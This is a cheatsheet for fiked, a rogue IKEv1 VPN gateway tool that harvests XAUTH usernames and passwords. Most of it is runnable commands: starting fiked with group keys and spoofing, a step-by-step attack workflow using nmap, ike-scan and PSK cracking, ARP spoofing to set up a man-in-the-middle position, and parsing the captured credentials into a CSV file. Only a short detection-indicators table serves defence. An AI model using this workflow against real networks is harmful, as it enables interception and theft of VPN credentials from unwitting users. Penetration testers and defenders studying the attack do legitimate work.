# Fiked (FakeIKEd) Cheatsheet

## Quick Start

```bash
# Basic credential capture
sudo fiked -g 192.168.1.1 -k MyGroup:MyPSK

# With logging
sudo fiked -g 192.168.1.1 -k MyGroup:MyPSK -l vpn_creds.log

# Daemon mode with logging
sudo fiked -g 192.168.1.1 -k MyGroup:MyPSK -d -q -l vpn_creds.log
```

## Command Reference

| Flag | Description | Example |
|------|-------------|---------|
| `-g` | VPN gateway IP to impersonate | `-g 192.168.1.1` |
| `-k` | Group ID:PSK pair | `-k MyGroup:MySecret` |
| `-r` | Use raw socket (IP spoofing) | `-r` |
| `-d` | Daemon mode | `-d` |
| `-q` | Quiet mode | `-q` |
| `-u` | Drop to user after startup | `-u nobody` |
| `-l` | Credential log file | `-l creds.log` |
| `-L` | Verbose log file | `-L debug.log` |
| `-h` | Print help | `-h` |
| `-V` | Print version | `-V` |

## Basic Operations

### Single Gateway

```bash
sudo fiked -g 192.168.1.1 -k Corporate:VPNSecret123
```

### Multiple Group Keys

```bash
sudo fiked -g 192.168.1.1 -k Group1:PSK1 -k Group2:PSK2 -k Default:SharedSecret
```

### With IP Spoofing

```bash
sudo fiked -r -g 192.168.1.1 -k MyGroup:MyPSK
```

### Verbose Debugging

```bash
sudo fiked -g 192.168.1.1 -k MyGroup:MyPSK -L /tmp/fiked_debug.log
```

### Background Operation

```bash
sudo fiked -g 192.168.1.1 -k MyGroup:MyPSK -d -q -l /var/log/vpn_creds.log
```

## Attack Workflow

```bash
# Step 1: Discover VPN gateway
nmap -sU -p 500 192.168.1.0/24

# Step 2: Identify IKE configuration
ike-scan -M 192.168.1.1

# Step 3: If PSK known, start Fiked
sudo fiked -g 192.168.1.1 -k DiscoveredGroup:KnownPSK -l creds.log

# Step 4: If PSK unknown, attempt to crack
ike-scan --pskcrack=psk.txt 192.168.1.1
# Then: fiked -g 192.168.1.1 -k Group:CrackedPSK
```

## Network Prerequisites

```bash
# Verify gateway reachability
ping 192.168.1.1

# Check IKE port
nmap -sU -p 500 192.168.1.1

# ARP spoofing (if needed for MITM)
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
sudo sysctl -w net.ipv4.ip_forward=1
```

## IKE Protocol Reference

### IKE Phase 1 (Main Mode)
```
Initiator → Responder: SA, Nonce, Key Exchange, ID
Responder → Initiator: SA, Nonce, Key Exchange, ID
[Encrypted] Initiator → Responder: Hash
[Encrypted] Responder → Initiator: Hash
```

### XAUTH Exchange
```
Gateway → Client: XAUTH Request (username)
Client → Gateway: XAUTH Reply (username)
Gateway → Client: XAUTH Request (password)
Client → Gateway: XAUTH Reply (password)
Gateway → Client: XAUTH Result (success/fail)
```

## Supported Configurations

| Config | Supported |
|--------|-----------|
| IKEv1 Main Mode | Yes |
| IKEv1 Aggressive Mode | Yes |
| IKEv2 | No |
| PSK+XAUTH | Yes |
| Certificate Auth | No |
| Hybrid Auth | Partial |

## Integration with ike-scan

```bash
# Step 1: Enumerate gateway
ike-scan -M -P -v 192.168.1.1

# Step 2: Capture PSK hash
ike-scan --pskcrack=hash.txt 192.168.1.1

# Step 3: Crack PSK
pskcrack hash.txt

# Step 4: Use captured PSK
sudo fiked -g 192.168.1.1 -k GroupName:CrackedPSK -l creds.log
```

## Log Analysis

```bash
# Parse credentials
grep -E "^(XAUTH|Username|Password)" vpn_creds.log

# Export to CSV
awk -F'[: ]' '{print $2","$4}' vpn_creds.log > vpn_creds.csv

# Monitor live
tail -f vpn_creds.log
```

## Troubleshooting

```bash
# Port 500 in use
sudo ss -lunp | grep :500
sudo systemctl stop strongswan

# IKE negotiation fails
# Check IKE version (Fiked only supports IKEv1)
ike-scan -M 192.168.1.1

# Raw socket errors
sudo fiked -r -g 192.168.1.1 -k Group:PSK
getcap /usr/bin/fiked

# XAUTH not captured
# Enable verbose logging
sudo fiked -g 192.168.1.1 -k Group:PSK -L debug.log
```

## Port Requirements

| Port | Protocol | Service |
|------|----------|---------|
| 500 | UDP | IKE (Internet Key Exchange) |
| 4500 | UDP | NAT-T (NAT Traversal) |

## Detection Indicators

| Indicator | Description |
|-----------|-------------|
| IKE from wrong MAC | Responses from non-gateway source |
| Duplicate IKE | Two IKE responses for same client |
| XAUTH in plaintext | Should be encrypted after Phase 1 |
| IKE failures | Phase 1 succeeds but tunnel fails |

## Related Tools

| Tool | Purpose |
|------|---------|
| `ike-scan` | IKE enumeration and PSK cracking |
| `strongSwan` | IPsec VPN implementation |
| `charon` | IKEv2 daemon |
| `scapy` | Packet crafting/analysis |
| `vpnc` | Cisco VPN client |
